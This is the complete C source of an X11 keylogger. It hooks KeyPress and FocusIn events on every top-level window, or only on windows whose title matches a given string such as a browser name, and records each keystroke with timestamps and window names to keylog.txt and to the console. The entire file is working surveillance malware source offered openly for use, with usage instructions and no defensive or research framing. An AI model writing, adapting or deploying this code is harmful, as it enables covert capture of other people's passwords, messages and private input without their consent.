/*
 * Usage Example:
 *    gcc -o xkey xkey.c -lX11 -lm
 *    ./xkey :0 "designate_name"
 *
 * If there is at least one top-level window whose name contains "designate_name",
 * we ONLY capture KeyPress/FocusIn from that window (or those windows).
 * Otherwise, we capture from ALL top-level windows as before.
 */

#include <stdio.h>
#include <stdlib.h>
#include <time.h>
#include <string.h>
#include <X11/X.h>
#include <X11/Xlib.h>
#include <X11/Intrinsic.h>
#include <X11/StringDefs.h>
#include <X11/Xutil.h>
#include <X11/Shell.h>

Display *d;

/* --------------------------------------------------
 * A small utility to safely get the local time
 * as a string (YYYY-mm-dd HH:MM:SS).
 * -------------------------------------------------- */
void getTimeStr(char *buf, size_t buflen)
{
    time_t current_time = time(NULL);
    if (current_time == (time_t)-1)
    {
        perror("time");
        snprintf(buf, buflen, "UnknownTime");
        return;
    }

    struct tm *local_time = localtime(&current_time);
    if (!local_time)
    {
        snprintf(buf, buflen, "UnknownTime");
        return;
    }

    strftime(buf, buflen, "%Y-%m-%d %H:%M:%S", local_time);
}

/* --------------------------------------------------
 * Helper function to retrieve a window's name.
 *  - Tries _NET_WM_NAME first (UTF-8)
 *  - Falls back to XFetchName (old WM_NAME)
 *
 * Returns a newly allocated string, or NULL if none.
 * The caller is responsible for XFree() or free() of
 * the returned pointer, depending on which path is used.
 * -------------------------------------------------- */
char *getWindowName(Display *disp, Window w)
{
    Atom netWmName = XInternAtom(disp, "_NET_WM_NAME", False);
    Atom actualType;
    int actualFormat;
    unsigned long nitems, bytesAfter;
    unsigned char *prop = NULL;

    // 1) Try _NET_WM_NAME
    if (XGetWindowProperty(disp, w, netWmName,
                           0, (~0L),
                           False, AnyPropertyType,
                           &actualType, &actualFormat,
                           &nitems, &bytesAfter,
                           &prop) == Success &&
        prop)
    {
        // It's often UTF-8 text
        char *name_utf8 = strdup((char *)prop);
        XFree(prop);
        return name_utf8;
    }

    // 2) Fall back to XFetchName (old WM_NAME)
    char *name_legacy = NULL;
    if (XFetchName(disp, w, &name_legacy) && name_legacy)
    {
        // name_legacy is allocated by XFetchName, must XFree it eventually
        return name_legacy; // we'll return it directly
    }

    return NULL;
}

/* --------------------------------------------------
 * We’ll use this function to decide if a window name
 * "matches" the designated string (by substring check).
 * -------------------------------------------------- */
int nameMatchesDesignated(char *wname, const char *designated)
{
    if (!wname || !*wname)
        return 0;
    if (!designated || !*designated)
        return 0;

    // Substring match. If you want exact match, use strcmp(wname, designated) == 0
    return (strstr(wname, designated) != NULL);
}

/* --------------------------------------------------
 * We'll store *all* top-level windows that match the
 * designated name in a global or static array.
 * -------------------------------------------------- */
static Window *matched_windows = NULL;
static int matched_count = 0;

/*
 * Recursively query children of "root" for top-level windows,
 * check if name matches "designated". If so, store them in
 * a dynamic array matched_windows[].
 */
void find_matched_windows(Window root, const char *designated)
{
    Window parent, *children;
    unsigned int nchildren;
    if (!XQueryTree(d, root, &root, &parent, &children, &nchildren) || nchildren == 0)
    {
        return;
    }

    for (unsigned int i = 0; i < nchildren; i++)
    {
        // For each child, attempt to get the window name
        char *wname = getWindowName(d, children[i]);
        if (wname)
        {
            if (nameMatchesDesignated(wname, designated))
            {
                matched_count++;
                matched_windows = realloc(matched_windows, matched_count * sizeof(Window));
                matched_windows[matched_count - 1] = children[i];
            }
            XFree(wname); // or free(wname) depending on which call allocated it
        }

        // Recursively look for deeper children
        find_matched_windows(children[i], designated);
    }

    if (children)
    {
        XFree(children);
    }
}

/* --------------------------------------------------
 * We want to do one pass:
 *   - find all windows matching designated name
 *   - If found => only select KeyPressMask/FocusChangeMask on them
 *   - If none found => select KeyPressMask/FocusChangeMask on *all* windows
 * -------------------------------------------------- */
void snoop_windows(const char *designated, int *foundAnyMatches)
{
    Window root = DefaultRootWindow(d);

    // 1) Gather all windows that match "designated"
    find_matched_windows(root, designated);

    if (matched_count > 0)
    {
        // We found at least one matching window
        *foundAnyMatches = 1;

        // Select KeyPressMask + FocusChangeMask only on matched windows
        for (int i = 0; i < matched_count; i++)
        {
            XSelectInput(d, matched_windows[i], KeyPressMask | FocusChangeMask);
        }
    }
    else
    {
        // No match => catch them all (like the original code)
        *foundAnyMatches = 0;

        // Just do a recursion that selects input on every child window
        // same approach as original "snoop_all_windows", but no double
        // select on the root if that caused duplicates.
        Window parent, *children;
        unsigned int nchildren;

        if (XQueryTree(d, root, &root, &parent, &children, &nchildren) && (nchildren > 0))
        {
            for (unsigned int i = 0; i < nchildren; i++)
            {
                XSelectInput(d, children[i], KeyPressMask | FocusChangeMask);

                // Then recursively select on sub-children
                // a small helper function:
                void recursive_select(Window w)
                {
                    Window par, *ch;
                    unsigned int nch;
                    if (!XQueryTree(d, w, &w, &par, &ch, &nch) || nch == 0)
                        return;
                    for (unsigned int k = 0; k < nch; k++)
                    {
                        XSelectInput(d, ch[k], KeyPressMask | FocusChangeMask);
                        recursive_select(ch[k]);
                    }
                    XFree(ch);
                }
                recursive_select(children[i]);
            }
            XFree(children);
        }
    }
}

/* --------------------------------------------------
 * Translate a KeyPress event into a readable string.
 * -------------------------------------------------- */
#define KEY_BUFF_SIZE 256
static char key_buff[KEY_BUFF_SIZE];

char *TranslateKeyCode(XEvent *ev)
{
    KeySym ks;
    XKeyEvent *xk = (XKeyEvent *)ev;
    int count = XLookupString(xk, key_buff, KEY_BUFF_SIZE, &ks, NULL);
    key_buff[count] = '\0';

    // If count == 0, might be special keys (Return, Tab, etc.)
    if (count == 0)
    {
        char *tmp = XKeysymToString(ks);
        if (tmp)
            snprintf(key_buff, KEY_BUFF_SIZE, "<%s>", tmp);
        else
            snprintf(key_buff, KEY_BUFF_SIZE, "<UnknownKey>");
    }

    return key_buff;
}

/* --------------------------------------------------
 * main()
 * -------------------------------------------------- */
int main(int argc, char **argv)
{
    char *hostname;
    if (argc < 2)
    {
        fprintf(stderr, "Usage: %s <display> <designated-name>\n", argv[0]);
        fprintf(stderr, "Example: %s :0 firefox\n", argv[0]);
        exit(1);
    }

    hostname = argv[1];
    const char *designated_name = (argc >= 3) ? argv[2] : "";

    d = XOpenDisplay(hostname);
    if (d == NULL)
    {
        fprintf(stderr, "Cannot open display: %s\n", hostname);
        exit(10);
    }

    // 1) Attempt to find and select on designated windows
    //    or select on all if none found.
    int foundAnyMatches = 0;
    snoop_windows(designated_name, &foundAnyMatches);

    FILE *fp = fopen("keylog.txt", "w");
    if (!fp)
    {
        perror("fopen keylog.txt");
        exit(1);
    }
    fprintf(fp, "Keylogger started\n");
    fclose(fp);

    // 2) The main event loop
    while (1)
    {
        XEvent xev;
        XNextEvent(d, &xev);

        fp = fopen("keylog.txt", "a");
        if (!fp)
        {
            perror("fopen keylog.txt");
            exit(1);
        }

        if (xev.type == FocusIn)
        {
            // Window gained focus
            XFocusChangeEvent *fc = (XFocusChangeEvent *)&xev;
            Window focusedWin = fc->window;

            char *wname = getWindowName(d, focusedWin);
            if (wname && *wname)
            {
                char time_str[64];
                getTimeStr(time_str, sizeof(time_str));

                // Print to console
                printf("\n[%s] FocusIn: 0x%lx => %s\n",
                       time_str, (unsigned long)focusedWin, wname);

                // Log to file
                fprintf(fp, "\n[%s] FocusIn: %s\n", time_str, wname);
            }
            if (wname)
                XFree(wname);
        }
        else if (xev.type == KeyPress)
        {
            // Key pressed
            char *ks = TranslateKeyCode(&xev);
            if (ks)
            {
                // Print to console
                printf("%s", ks);

                // Print to file
                fprintf(fp, "%s", ks);
            }
        }

        fclose(fp);
        fflush(stdout);
    }

    XCloseDisplay(d);
    free(matched_windows);
    return 0;
}
